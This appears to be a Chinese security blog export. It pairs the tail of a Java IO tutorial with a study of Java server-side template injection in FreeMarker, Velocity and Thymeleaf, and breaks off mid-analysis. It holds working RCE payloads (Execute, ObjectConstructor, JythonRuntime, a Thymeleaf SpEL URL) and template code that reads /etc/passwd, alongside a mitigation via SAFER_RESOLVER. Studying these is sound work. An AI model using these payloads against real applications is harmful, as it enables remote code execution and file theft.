new File(String parent, String child)\n\n和之前两种方法还是有一些差距的。\npackage src.IOStream;  \n  \nimport java.io.File;  \nimport java.io.IOException;  \n  \n// 根据父目录路径，在子路径下生成文件  \npublic class newFile03 &#123;  \n    public static void main(String[] args) &#123;  \n        createFile();  \n &#125;  \n    public static void createFile()&#123;  \n        String parentPath = \"Serialable/src/IOStream/CreateForFile\";  \n String fileName = \"new3.txt\";  \n File file = new File(parentPath, fileName);  \n try&#123;  \n            file.createNewFile();  \n System.out.println(\"Create Successfully\");  \n &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n    &#125;  \n&#125;\n\n创建三个 txt 文件。\n\n\n0x03 获取文件信息我们先在 new1.txt 当中编辑一些消息\n\n\n我们通过 file 类的方法名进行一些基本信息的获取\npackage src.IOStream;  \n  \nimport java.io.File;  \n  \npublic class GetFileInfo &#123;  \n    public static void main(String[] args) &#123;  \n        getFileContents();  \n &#125;  \n  \n    public static void getFileContents()&#123;  \n        File file = new File(\"Serialable/src/IOStream/CreateForFile/new1.txt\");  \n System.out.println(\"文件名称为：\" + file.getName());  \n System.out.println(\"文件的绝对路径为：\" + file.getAbsolutePath());  \n System.out.println(\"文件的父级目录为：\" + file.getParent());  \n System.out.println(\"文件的大小(字节)为：\" + file.length());  \n System.out.println(\"这是不是一个文件：\" + file.isFile());  \n System.out.println(\"这是不是一个目录：\" + file.isDirectory());  \n &#125;  \n&#125;\n\n输出如图\n\n\n0x04 目录与文件操作1. 文件删除\n使用 file.delete(文件)\n\npackage src.IOStream;  \n  \nimport java.io.File;  \nimport java.lang.reflect.Field;  \n  \n// 文件删除  \npublic class FileDelete &#123;  \n    public static void main(String[] args) &#123;  \n        deleteFile();  \n &#125;  \n    public static void deleteFile()&#123;  \n        File file = new File(\"Serialable/src/IOStream/CreateForFile/new1.txt\");  \n System.out.println(file.delete() ? \"Delete Successfully\":\"Delete failed\");  \n &#125;  \n&#125;\n\n\n\n2. 目录删除\n方法 file.delete(目录)，这里有个小坑，只有空的目录才可以删除，不然会显示删除失败。\n我在 CreateForFile 同级目录下新建了一个文件夹 CreateForDelete 用以测试。\n\npackage src.IOStream;  \n  \nimport java.io.File;  \n  \n//删除目录  \npublic class DirectoryDelete &#123;  \n    public static void main(String[] args) &#123;  \n        deleteDirectory();  \n &#125;  \n    public static void deleteDirectory()&#123;  \n        File file = new File(\"Serialable/src/IOStream/CreateForDelete\");  \n System.out.println(file.delete()? \"Delete Successfully\":\"Delete failed\");  \n &#125;  \n&#125;\n\n3. 创建单级目录\n方法 file.mkdir()\n\npackage src.IOStream;  \n  \nimport java.io.File;  \n  \n// 创建单级目录  \npublic class CreateSingleDirectory &#123;  \n    public static void main(String[] args) &#123;  \n        createSingleDir();  \n &#125;  \n    public static void createSingleDir()&#123;  \n        File file = new File(\"Serialable/src/IOStream/CreateForDirectory\");  \n System.out.println(file.mkdir() ? \"Create Successfully\":\"Create failed\");  \n &#125;  \n&#125;\n\n成功创建\n4. 创建多级目录\n方法 file.mkdirs()，注意多了个 s 别搞错了。\n\npackage src.IOStream;  \n  \nimport java.io.File;  \n  \n// 创建多级目录  \npublic class CreateMultiDirectory &#123;  \n    public static void main(String[] args) &#123;  \n        createMultiDir();  \n &#125;  \n  \n    public static void createMultiDir()&#123;  \n        File file = new File(\"Serialable/src/IOStream/CreateMultiDirectory/test\");  \n System.out.println(file.mkdirs() ? \"Create Successfully\":\"Create failed\");  \n  \n &#125;  \n&#125;\n\n\n\n0x05 回归 IO 知识点 —— IO 流分类按照操作数据单位不同分为：字节流和字符流\n\n字节流（8bit，适用于二进制文件）\n字符流（按字符，因编码不同而异，适用于文本文件）\n\n按照数据流流向不同分为：输入流和输出流\n按照流的角色不同分为：节点流，处理流&#x2F;包装流\n\n\n\n抽象基类\n字节流\n字符流\n\n\n\n输入流\nInputStream\nReader\n\n\n输出流\nOutputStream\nWriter\n\n\n\n到这里就非常重要了，因为它与我们后续的命令执行直接相关。这些 IO 流在我们命令执行的 Payload 当中充当着缓冲的作用。\n\n0x06 关于文件流的一些操作要讲文件流的一些操作，不妨先以 Payload 看起，这样不会特别枯燥与抽象。\n1. Runtime 命令执行操作的 Payloadpackage src.CommandExec;  \n  \nimport java.io.ByteArrayOutputStream;  \nimport java.io.InputStream;  \n  \n// 使用 Runtime 类进行命令执行  \npublic class RuntimeExec &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        InputStream inputStream = Runtime.getRuntime().exec(\"whoami\").getInputStream();  \n byte[] cache = new byte[1024];  \n ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  \n int readLen = 0;  \n while ((readLen = inputStream.read(cache))!=-1)&#123;  \n            byteArrayOutputStream.write(cache, 0, readLen);  \n &#125;  \n        System.out.println(byteArrayOutputStream);  \n &#125;  \n&#125;\n\n其中，byte[] cache = new byte[1024] 用来缓存数据，我们结合这一串 Payload 来学习 Java IO 流甚好。\n2. FileInputStreamread() 方法read() 方法到底是啥样的呢，我们跳进去看看\nread() \n\tpublic int read() throws IOException \n\t从此输入流中读取一个数据字节。\n\t\n\t如果没有输入可用，则此方法将阻塞。 \n\t\n\t指定者： 类 InputStream 中的 read \n\t\n\t返回： 下一个数据字节；如果已到达文件末尾，则返回 -1。 \n\t\n\t抛出： IOException - 如果发生 I/O 错误。\n\n\n之前我们用 file 的一系列操作读取过文件的信息，现在我们用 FileInputStream.read() 来读取文件内容。\npackage src.IOStream;  \n  \nimport java.io.FileInputStream;  \nimport java.io.IOException;  \n  \n// 使用 FileInputStream.read 读取文件  \npublic class FileInputRead &#123;  \n    public static void main(String[] args) &#123;  \n        readFile();  \n &#125;  \n    public static void readFile()&#123;  \n        String filePath = \"Serialable/src/IOStream/CreateForFile/new1.txt\";  \n FileInputStream fileInputStream = null;  \n int readData = 0;  \n try&#123;  \n            fileInputStream = new FileInputStream(filePath);  \n while((readData = fileInputStream.read())!=-1)&#123;  \n                System.out.print((char)readData);  \n &#125;  \n        &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125; finally &#123;  \n            try&#123;  \n                fileInputStream.close();  \n &#125; catch (IOException e)&#123;  \n                e.printStackTrace();  \n &#125;  \n        &#125;  \n    &#125;  \n&#125;\n\n成功读取到文件内容，这里有个小坑，若我们 sout 的时候进行了换行，则每一个字符都会经过换行。而如果不设置换行，才是正常的输出。\n\nread(byte[] d) 方法允许在方法中添加一个字节数组。这种方式很有意思，当我们设置缓冲区的值为 8 时，若文件中的字符长度超过了 8，则会换行输出。这和上面的换行实际上是异曲同工。\n再回到之前我们讲的 Runtime 类进行命令执行的 Payload，在那里，我们设置的 Cache 缓冲区的值为 1024.\nread(byte[] d) 方法\npackage src.IOStream;  \n  \nimport java.io.FileInputStream;  \nimport java.io.IOException;  \n  \n// read(byte[] d) 方法，允许在方法中添加一个字节数组  \npublic class FileInputRead02 &#123;  \n    public static void main(String[] args) &#123;  \n        readFile();  \n &#125;  \n    public static void readFile()&#123;  \n        String filePath = \"Serialable/src/IOStream/CreateForFile/new1.txt\";  \n FileInputStream fileInputStream = null;  \n byte[] cache = new byte[8]; // 设置缓冲区，缓冲区大小为 8 字节  \n int readLen = 0;  \n try &#123;  \n            fileInputStream = new FileInputStream(filePath);  \n while((readLen = fileInputStream.read(cache)) != -1)&#123;  \n                System.out.println(new String(cache, 0, readLen));  \n &#125;  \n        &#125; catch (IOException e)&#123;  \n                e.printStackTrace();  \n &#125; finally &#123;  \n            try &#123;  \n                fileInputStream.close();  \n &#125; catch (IOException e)&#123;  \n                e.printStackTrace();  \n &#125;  \n        &#125;  \n    &#125;  \n&#125;\n\n这里的 while 会运行三次，会读取文件当中所有的字符。\n\n\n3. FileOutputStream往文件里面写数据简单的 write(int b) 这里先不提\nwrite(byte[] b) 方法write(byte[] b)\npublic void write(byte[] b)\n           throws IOException\n将 b.length 个字节从指定 byte 数组写入此文件输出流中。\n覆盖：\n类 OutputStream 中的 write\n参数：\nb - 数据。\n抛出：\nIOException - 如果发生 I/O 错误。\n\n我们尝试向文件当中写入数据，这里写代码的时候小心一点，容易踩坑的。\npackage src.IOStream;  \n  \nimport java.io.FileNotFoundException;  \nimport java.io.FileOutputStream;  \nimport java.io.IOException;  \n  \n// write(byte[] b) 方法  \npublic class FileOutputWrite01 &#123;  \n    public static void main(String[] args) &#123;  \n        writeFile();  \n &#125;  \n  \n    public static void writeFile() &#123;  \n        String filePath = \"Serialable/src/IOStream/CreateForFile/new1.txt\";  \n FileOutputStream fileOutputStream = null;  \n try &#123; // 注意fileOutputStream的作用域，因为fileOutputStream需要在finally分支中被异常捕获  \n // 所以这里的 try 先不闭合  \n fileOutputStream = new FileOutputStream(filePath);  \n String content = \"gulugulu\";  \n try &#123;  \n                //write(byte[] b) 将 b.length 个字节从指定 byte 数组写入此文件输出流中  \n //String类型的字符串可以使用getBytes()方法将字符串转换为byte数组  \n fileOutputStream.write(content.getBytes());  \n &#125; catch (IOException e) &#123;  \n                e.printStackTrace();  \n &#125;  \n        &#125;catch (FileNotFoundException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n        finally &#123;  \n            try &#123;  \n                fileOutputStream.close();  \n &#125; catch (IOException e)&#123;  \n                e.printStackTrace();  \n &#125;  \n        &#125;  \n    &#125;  \n&#125;\n\n\n\nwrite(byte[] b, int off, int len) 方法\n将指定 byte 数组中从偏移量 off 开始的 len 个字节写入此文件输出流。\n\n这里的长度一定要与输入的字符相等。\npackage src.IOStream;  \n  \nimport java.io.FileNotFoundException;  \nimport java.io.FileOutputStream;  \nimport java.io.IOException;  \nimport java.nio.charset.StandardCharsets;  \n  \n// write(byte[] b) 方法  \npublic class FileOutputWrite02 &#123;  \n    public static void main(String[] args) &#123;  \n        writeFile();  \n &#125;  \n  \n    public static void writeFile() &#123;  \n        String filePath = \"Serialable/src/IOStream/CreateForFile/new1.txt\";  \n FileOutputStream fileOutputStream = null;  \n try &#123; // 注意fileOutputStream的作用域，因为fileOutputStream需要在finally分支中被异常捕获  \n // 所以这里的 try 先不闭合  \n fileOutputStream = new FileOutputStream(filePath);  \n String content = \"drinkdrink\";  \n try &#123;  \n                //write(byte[] b) 将 b.length 个字节从指定 byte 数组写入此文件输出流中  \n //String类型的字符串可以使用getBytes()方法将字符串转换为byte数组  \n fileOutputStream.write(content.getBytes(StandardCharsets.UTF_8), 0, 10);  \n &#125; catch (IOException e) &#123;  \n                e.printStackTrace();  \n &#125;  \n        &#125;catch (FileNotFoundException e)&#123;  \n            e.printStackTrace();  \n &#125;  \n        finally &#123;  \n            try &#123;  \n                fileOutputStream.close();  \n &#125; catch (IOException e)&#123;  \n                e.printStackTrace();  \n &#125;  \n        &#125;  \n    &#125;  \n&#125;\n\n\n\n追加写入如果想要写入的数据不被覆盖，可以设置 FileOutputStream 的构造方法 append 参数设置为 true\nfileOutputStream = new FileOutputStream(filePath);\n// 设置追加写入\nfileOutputStream = new FileOutputStream(filePath), true;\n\n4. 文件拷贝 ———— input outp 结合利用前文讲的 fileInputStream 和 fileOutputStream 进行文件拷贝。\n原理上来说，先将文件的内容(注意，其实图片当中也是内容，这个内容不光是文字！) 读取出来，再写入新的文件当中。\npackage src.IOStream;  \n  \nimport java.io.FileInputStream;  \nimport java.io.FileOutputStream;  \nimport java.io.IOException;  \n  \n// 文件拷贝操作  \npublic class FileCopy &#123;  \n    public static void main(String[] args) &#123;  \n            copyFile();  \n &#125;  \n    public static void copyFile()&#123;  \n        String srcFilename = \"Serialable/src/IOStream/CreateForFile/new1.txt\";  \n String desFilename = \"Serialable/src/IOStream/CreateForFile/new2.txt\";  \n FileInputStream fileInputStream = null;  \n FileOutputStream fileOutputStream = null;  \n try &#123;  \n            fileInputStream = new FileInputStream(srcFilename);  \n fileOutputStream = new FileOutputStream(desFilename);  \n byte[] cache = new byte[1024];  \n int readLen = 0;  \n while((readLen = fileInputStream.read(cache)) != -1)&#123;  \n                fileOutputStream.write(cache, 0, readLen);  \n &#125;  \n    &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125; finally &#123;  \n            try &#123;  \n                fileInputStream.close();  \n fileOutputStream.close();  \n &#125; catch (IOException e)&#123;  \n                e.printStackTrace();  \n &#125;  \n        &#125;  \n        &#125;  \n&#125;\n\n\n\n5. FileReaderpublic class FileReader extends InputStreamReader\n用来读取字符文件的便捷类。此类的构造方法假定默认字符编码和默认字节缓冲区大小都是适当的。要自己指定这些值，可以先在 FileInputStream 上构造一个 InputStreamReader。\nFileReader 用于读取字符流。要读取原始字节流，请考虑使用 FileInputStream。\n\n下方测试代码将会将 Serialable/src/IOStream/CreateForFile/new1.txt 中的 new1.tx 文件打印输出至控制台：\npackage src.IOStream;  \n  \nimport java.io.FileReader;  \nimport java.io.IOException;  \n  \n// 读取文件的字符流  \npublic class FileReaderPrint &#123;  \n    public static void main(String[] args) &#123;  \n        readFile();  \n &#125;  \n    public static void readFile()&#123;  \n        String filePath = \"Serialable/src/IOStream/CreateForFile/new1.txt\";  \n FileReader fileReader = null;  \n try &#123;  \n            fileReader = new FileReader(filePath);  \n int readLen = 0;  \n char[] cache = new char[8];  \n while ((readLen = fileReader.read(cache))!=-1)&#123;  \n                System.out.println(new String(cache, 0, readLen));  \n &#125;  \n        &#125; catch (IOException e)&#123;  \n            e.printStackTrace();  \n &#125; finally &#123;  \n            try &#123;  \n                fileReader.close();  \n &#125; catch (IOException e)&#123;  \n                e.printStackTrace();  \n &#125;  \n        &#125;  \n    &#125;  \n&#125;\n\n\n\n\nFileReader 将会一个一个字符读取，因此可以不乱码输出中文\n\n0x07 小结Java IO 流搞完咯，冲冲冲！\n","categories":["Java"],"tags":["Java"]},{"title":"Java OWASP SSTI 学习","url":"/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/","content":"Java SSTI 学习\n\n0x01 前言最近和 F1or 大师傅一起挖洞的时候发现一处某 CMS SSTI 的 0day，之前自己在复现 jpress 的一些漏洞的时候也发现了 SSTI 这个洞杀伤力之大。今天来好好系统学习一手。\n\n有三个最重要的模板，其实模板引擎本质上的原理差不多，因为在 SpringBoot 初学习的阶段我就已经学习过 Thymeleaf 了，所以大体上老生常谈的东西就不继续讲了。\n\n三个模板的模板注入攻击差距其实还是有点大的，而且 Java 的 SSTI 和 Python Flask 的一些 SSTI 差距有点大。\n0x02 FreeMarker SSTIFreeMarker 官网：http://freemarker.foofun.cn/index.html\n对应版本是 2.3.23，一会儿我们搭建环境的时候也用这个版本\nFreeMarker 基础语法关于文本与注释，本文不再强调，重点看插值与 FTL 指令。\n插值\n插值也叫 Interpolation，即 $&#123;..&#125; 或者 #&#123;..&#125; 格式的部分，将使用数据模型中的部分替代输出\n\n比如这一个 .ftl 文件\n&lt;!DOCTYPE html>  \n&lt;html lang=\"en\">  \n&lt;head>  \n    &lt;meta charset=\"UTF-8\">  \n    &lt;title>Hello $&#123;name&#125;!&lt;/title>  \n    &lt;link href=\"/css/main.css\" rel=\"stylesheet\">  \n&lt;/head>  \n&lt;body>  \n    &lt;h2 class=\"hello-title\">Hello $&#123;name&#125;!&lt;/h2>   \n    &lt;script src=\"/js/main.js\">&lt;/script>  \n&lt;/body>  \n&lt;/html>\n\n\n那么 $&#123;name&#125; 的数据就会从传参里面拿，对应的这个是在 addAttribute 中的 name 参数\n\nFTL 指令FTL 指令以 # 开头，其他语法和 HTML 大致相同。\n\n我这里其实也花了不少时间看了 FreeMarker 的基础语法，但是并非很透彻，就不误人子弟了，有兴趣的师傅可以自己前往 FreeMarker 手册查看。\n\nhttps://freemarker.apache.org/ \nFreeMarker SSTI 成因与攻击面看了一些文章，有些地方有所疏漏，先说 SSTI 的攻击面吧，我们都知道 SSTI 的攻击面其实是模板引擎的渲染，所以我们要让 Web 服务器将 HTML 语句渲染为模板引擎，前提是要先有 HTML 语句。那么 HTML 如何才能被弄上去呢？这就有关乎我们的攻击面了。\n\n将 HTML 语句放到服务器上有两种方法：\n1、文件上传 HTML 文件。\n2、若某 CMS 自带有模板编辑功能，这种情况非常多。\n\n因为之前有接触过 Thymeleaf 的 SSTI，Thymeleaf 的 SSTI 非常锋利， Thymeleaf SSTI 的攻击往往都是通过传参即可造成 RCE（当然这段话很可能是不严谨的\n在刚接触 FreeMarker 的 SSTI 的时候，我误以为它和 Thyemelaf 一样，直接通过传参就可以打，后来发现我的想法是大错特错。\n环境搭建\n一些开发的基本功，因篇幅限制，我也不喜放这些东西，贴个项目地址吧\n\nhttps://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/CodeReview\n漏洞复现前文我有提到，FreeMarker 的 SSTI 必须得是获取到 HTML，再把它转换成模板，从而引发漏洞，所以这里要复现，只能把 HTML 语句插入到 .ftl 里面，太生硬了简直。。。。。不过和 F1or 师傅一起挖出来的 0day 则是比较灵活，有兴趣的师傅可以滴一下我\npayload：\n&lt;#assign value=\"freemarker.template.utility.Execute\"?new()>$&#123;value(\"Calc\")&#125;\n\n\n\n构造出这个 PoC 的原因是 freemarker.template.utility.Execute 类里面存在如下图所示的命令执行方法，都写到脸上来了。\n\n\n漏洞复现如图\n\n\n漏洞分析我们要分析的是，MVC 的思维，以及如何走到这个危险类 ———— freemarker.template.utility.Execute 去的。\n下一个断点在 org.springframework.web.servlet.view.UrlBasedViewResolver#createView，开始调试\n\n\n跟进 super.createView()\n\n\n进一步跟进 loadView() 以及 buildView()，这些方法的业务意义都比较好理解，先 create 一个 View 视图，再将其 load 进来，最后再 build。\n\n\n\n\n\n\n在 buildView() 方法当中，先通过 this.instantiateView() 的方式 new 了一个 FreeMarkerView 类，又进行了一些基础赋值，将我们的 View Build 了出来（也就是 View 变得有模有样了）\n继续往下走，回到 loadView() 方法，loadView() 方法调用了 view.checkResource() 方法\n\n\ncheckResource() 方法做了两件事，第一件事是判断 Resource 当中的 url 是否为空，也就是判断是否存在 resource，如果 url 都没东西，那么后续的模板引擎加载就更不用说了；第二件事是进行 template 的获取，也可以把这理解为准备开始做模板引擎加载的业务了。\n\n\n跟进 getTemplate() 方法\n\n\n首先做了一些赋值判断，再判断 Template 的存在，我们跟进 this.cache.getTemplate\n\n\n这里从 cache 里面取值，而在我们 putTemplate 设置模板的时候，也会将至存储到 cache中。\n跟进 getTemplateInternal()\n\n\n先做了一些基本的判断，到 202 行，跟进 lookupTemplate() 方法\n\n\n这里代码很冗杂，最后的结果是跟进 &#96;freemarker.cache.TemplateCache#lookupWithLocalizedThenAcquisitionStrategy\n\n\n代码会先拼接 _zh_CN，再寻找未拼接 _zh_CN 的模板名，调用 this.findTemplateSource(path) 获取模板实例。\n\n\n这里就获取到了 handle 执行返回的模板视图实例，这里我 IDEA 没有走过去，就跟着奶思师傅的文章先分析了。\norg.springframework.web.servlet.DispatcherServlet#doDispatch 流程\n\n\nhandle 执行完成后调用 this.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException); 进行模板解析。\n\n\n调用 view.render(mv.getModelInternal(), request, response); 一路跟进至 org.springframework.web.servlet.view.freemarker.FreeMarkerView#doRender\n\n\n跟进 this.processTemplate()\n\n\n跟进 process()\n\n\n\nprocess() 方法是做了一个输出（生成） HTML 文件或其他文件的工作，相当于渲染的最后一步了。\n\n在 process() 方法中，会对 ftl 的文件进行遍历，读取一些信息，下面我们先说对于正常语句的处理，再说对于 ftl 表达式的处理。\n\n\n\n在读取到每一条 freeMarker 表达式语句的时候，会二次调用 visit() 方法，而 visit() 方法又调用了 element.accept()，跟进\n\n\n\n跟进 calculateInterpolatedStringOrMarkup() 方法\n\n\ncalculateInterpolatedStringOrMarkup() 方法做的业务是将模型强制为字符串或标记，跟进 eval() 方法\n\n\neval() 方法简单判断了 constantValue 是否为 null，这里 constantValue 为 null，跟进 this._eval()，一般的 _eval() 方法只是将 evn 获取一下，但是对于 ftl 语句就不是这样了，一般的 _eval() 方法如下\n\n\n而对于 ftl 表达式来说，accept 方法是这样的\n\n\n跟进一下 accept() 方法\n\n\n做了一系列基础判断，先判断 namespaceExp 是否为 null，接着又判断 this.operatorType  是否等于 65536，到第 105 行，跟进 eval() 方法，再跟进 _eval()\n\n\n\n\n我们可以看到 targetMethod 目前就是我们在 ftl 语句当中构造的那个能够进行命令执行的类，也就是说这一个语句相当于\nObject result = targetMethod.exec(argumentStrings);\n\n// 等价于\n\nObject result = freemarker.template.utility.Execute.exec(argumentStrings);\n\n而这一步并非直接进行命令执行，而是先把这个类通过 newInstance() 的方式进行初始化。\n命令执行的参数，会被拿出来，在下一次的同样流程中作为命令被执行，如图\n\n\n至此，分析结束，很有意思的一个流程分析。\n\n\nFreeMarker SSTI 的攻防二象性我们目前的 PoC 是这么打的\n&lt;#assign value=\"freemarker.template.utility.Execute\"?new()>$&#123;value(\"Calc\")&#125;\n\n这是因为 FreeMarker 的内置函数 new 导致的，下面我们简单介绍一下 FreeMarker的两个内置函数—— new 和 api\n内置函数 new可创建任意实现了 TemplateModel 接口的 Java 对象，同时还可以触发没有实现  TemplateModel 接口的类的静态初始化块。以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承 TemplateModel 接口的 freemarker.template.utility.JythonRuntime 和freemarker.template.utility.Execute\nAPIvalue?api 提供对 value 的 API（通常是 Java API）的访问，例如 value?api.someJavaMethod() 或 value?api.someBeanProperty。可通过 getClassLoader获取类加载器从而加载恶意类，或者也可以通过 getResource来实现任意文件读取。但是，当api_builtin_enabled为 true 时才可使用 api 函数，而该配置在 2.3.22 版本之后默认为 false。\n\n由此我们可以构造出一系列的 bypass PoC\n\nPOC1\n&lt;#assign classLoader=object?api.class.protectionDomain.classLoader> \n&lt;#assign clazz=classLoader.loadClass(\"ClassExposingGSON\")> \n&lt;#assign field=clazz?api.getField(\"GSON\")> \n&lt;#assign gson=field?api.get(null)> \n&lt;#assign ex=gson?api.fromJson(\"&#123;&#125;\", classLoader.loadClass(\"freemarker.template.utility.Execute\"))> \n$&#123;ex(\"Calc\"\")&#125;\n\nPOC2\n&lt;#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>$&#123;value(\"java.lang.ProcessBuilder\",\"Calc\").start()&#125;\n\nPOC3\n&lt;#assign value=\"freemarker.template.utility.JythonRuntime\"?new()>&lt;@value>import os;os.system(\"calc\")\n\nPOC4\n&lt;#assign ex=\"freemarker.template.utility.Execute\"?new()> $&#123; ex(\"Calc\") &#125;\n\n读取文件\n&lt;#assign is=object?api.class.getResourceAsStream(\"/Test.class\")>\nFILE:[&lt;#list 0..999999999 as _>\n    &lt;#assign byte=is.read()>\n    &lt;#if byte == -1>\n        &lt;#break>\n    &lt;/#if>\n$&#123;byte&#125;, &lt;/#list>]\n\n&lt;#assign uri=object?api.class.getResource(\"/\").toURI()>\n&lt;#assign input=uri?api.create(\"file:///etc/passwd\").toURL().openConnection()>\n&lt;#assign is=input?api.getInputStream()>\nFILE:[&lt;#list 0..999999999 as _>\n    &lt;#assign byte=is.read()>\n    &lt;#if byte == -1>\n        &lt;#break>\n    &lt;/#if>\n$&#123;byte&#125;, &lt;/#list>]\n\n从 2.3.17版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：1、UNRESTRICTED_RESOLVER：可以通过 ClassUtil.forName(className) 获取任何类。\n2、SAFER_RESOLVER：不能加载 freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类。3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。可通过freemarker.core.Configurable#setNewBuiltinClassResolver方法设置TemplateClassResolver，从而限制通过new()函数对freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor这三个类的解析。\n\n比较其他两个模板引擎来说，FreeMarker 的 SSTI 更为严格一些，它的防护也做的相当有力，这个给自己挖个小坑吧，后续去看一看 FreeMarker 的代码当中是否存在强而有力的 bypass payload\n\nFreeMarker SSTI 修复\n因为 FreeMarker 不能直接传参打，所以此处的代码参考奶思师傅。\n\npackage freemarker;\n\nimport freemarker.cache.StringTemplateLoader;\nimport freemarker.core.TemplateClassResolver;\nimport freemarker.template.Configuration;\nimport freemarker.template.Template;\n\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.io.StringWriter;\nimport java.util.HashMap;\n\npublic class freemarker_ssti &#123;\n    public static void main(String[] args) throws Exception &#123;\n\n        //设置模板\n        HashMap&lt;String, String> map = new HashMap&lt;String, String>();\n        String poc =\"&lt;#assign aaa=\\\"freemarker.template.utility.Execute\\\"?new()> $&#123; aaa(\\\"open -a Calculator.app\\\") &#125;\";\n        System.out.println(poc);\n        StringTemplateLoader stringLoader = new StringTemplateLoader();\n        Configuration cfg = new Configuration();\n        stringLoader.putTemplate(\"name\",poc);\n        cfg.setTemplateLoader(stringLoader);\n        //cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);\n        //处理解析模板\n        Template Template_name = cfg.getTemplate(\"name\");\n        StringWriter stringWriter = new StringWriter();\n\n        Template_name.process(Template_name,stringWriter);\n\n\n    &#125;\n&#125;\n\n\n\n\n0x03 Velocity SSTI基本语法# 关键字Velocity关键字都是使用 #开头的，如 #set、#if、#else、#end、#foreach 等$变量Velocity变量都是使用$开头的，如：$name、$msg&#123;&#125;变量Velocity对于需要明确表示的Velocity变量，可以使用 &#123;&#125; 将变量包含起来。！变量如果某个Velocity变量不存在，那么页面中就会显示$xxx的形式，为了避免这种形式，可以在变量名称前加上！。如页面中含有$msg，如果msg有值，将显示msg的值；如果不存在就会显示$msg。这是我们不希望看到的，为了把不存在的变量显示为空白，可以使用$!msg。\n直接打是可以的，当然配合 FJ 更优雅。\n此处的攻击面还是以文件上传和模板编写为主，在 jpress 的代码审计当中，师傅们可以看到那就是一个模板编写的攻击手法。\n漏洞复现这已在 jpress 中分析过了，不再赘述，对应地址：https://xz.aliyun.com/t/11832#toc-4，虽然那个框架是 jBoot，但是总体上是大差不差的\n0x04 Thymeleaf SSTIThymeleaf 语法基础Thymeleaf 表达式可以有以下类型：\n\n$&#123;...&#125;：变量表达式 —— 通常在实际应用，一般是OGNL表达式或者是 Spring EL，如果集成了Spring的话，可以在上下文变量（context variables ）中执行\n*&#123;...&#125;: 选择表达式 —— 类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。\n#&#123;...&#125;: Message (i18n) 表达式 —— 允许从外部源（比如.properties文件）检索特定于语言环境的消息\n@&#123;...&#125;: 链接 (URL) 表达式 —— 一般用在应用程序中设置正确的 URL&#x2F;路径（URL重写）。\n~&#123;...&#125;：片段表达式 —— Thymeleaf 3.x 版本新增的内容，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等\n\n实际上，Thymeleaf 出现 SSTI 问题的主要原因也正是因为这个片段表达式，我们知道片段表达式语法如下：\n\nThymeleaf SSTI 本质上还是 SpEL 表达式注入。\n\n实际上，只有 3.x 版本的 Thymeleaf 才会受到影响，因为在 2.x 中renderFragment的核心处理方法是这样的：\nprotected void renderFragment(Set&lt;String> markupSelectorsToRender, Map&lt;String, ?> model, HttpServletRequest request, HttpServletResponse response) throws Exception &#123;\n        ...\n                Configuration configuration = viewTemplateEngine.getConfiguration();\n                ProcessingContext processingContext = new ProcessingContext(context);\n                templateCharacterEncoding = getStandardDialectPrefix(configuration);\n                StandardFragment fragment = StandardFragmentProcessor.computeStandardFragmentSpec(configuration, processingContext, viewTemplateName, templateCharacterEncoding, \"fragment\");\n                if (fragment == null) &#123;\n                    throw new IllegalArgumentException(\"Invalid template name specification: '\" + viewTemplateName + \"'\");\n                &#125;   \n        ...\n\n并没有3.x 版本中对于片段表达式（~&#123;）的处理，也因此不会造成 SSTI 漏洞，以下是 SpringBoot 默认引用的 thymeleaf 版本\n\nspring boot:1.5.1.RELEASE spring-boot-starter-thymeleaf:2.1.5spring boot:2.0.0.RELEASE spring-boot-starter-thymeleaf:3.0.9spring boot:2.2.0.RELEASE spring-boot-starter-thymeleaf:3.0.11\n\n先用这一 EXP 打\n/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"Calc\").getInputStream()).next()%7d__::.x\n\nSpring MVC 对于 Thymeleaf 的解析流程\n大致流程图可以参照下图\n\n\n\n下个断点在 org.springframework.web.servlet.DispatcherServlet#doService，因为 DispatcherServlet 是 Spring 对前端控制器的默认拦截器。\n获取 Handler\n\n到 429 行，调用了 this.doDispatch() 方法，去寻找对应的 Handler Mappings，再由 Handle Mapping 返回 Controller，再去寻找对应的 Controller\n\n\n要寻找对应的 Handler Mappings，需要先获取到 Handler，所以在第 484 行调用了 getHandler() 方法，跟进一下。\n\n\n现在我们的 Handler Mappings 里存在五个 Handler，程序会通过迭代器进行遍历，我们跟进一下具体 Handler 的 getHandler() 方法做了什么业务。\n\n\n再跟进 getHandlerInternal() 方法，以及跟进父类的 getHandlerInternal() 方法\n\n\n关注一下返回值，是 var4，而 var4 是通过 this.lookupHandlerMethod() 调用获得的。所以此处，我们跟进 lookupHandlerMethod() 方法\n\n\nlookupHandlerMethod() 方法首先把 Web 应用程序被访问的子域拿出来，保存到一个数字当中，这个子域的变量名为 lookupPath，如果无法通过 uri 进行直接匹配，则对所有的注册的 RequestMapping 进行匹配。\n这里无法通过 uri 匹配的情况主要有三种： \n// ①在RequestMapping中定义的是PathVariable，如/user/detail/&#123;id&#125;； \n// ②在RequestMapping中定义了问号表达式，如/user/?etail； \n// ③在RequestMapping中定义了*或**匹配，如/user/detail/** // No choice but to go through all mappings...\n\n\n\n获取 Controller 并返回 Model And View使用一个比较器，对匹配的结果进行排序，获取相似度最高的一个作为结果返回，也就是 get(0)，而当存在两个匹配结果重合度一致的时候，抛出异常。这里匹配的结果是去 Controller 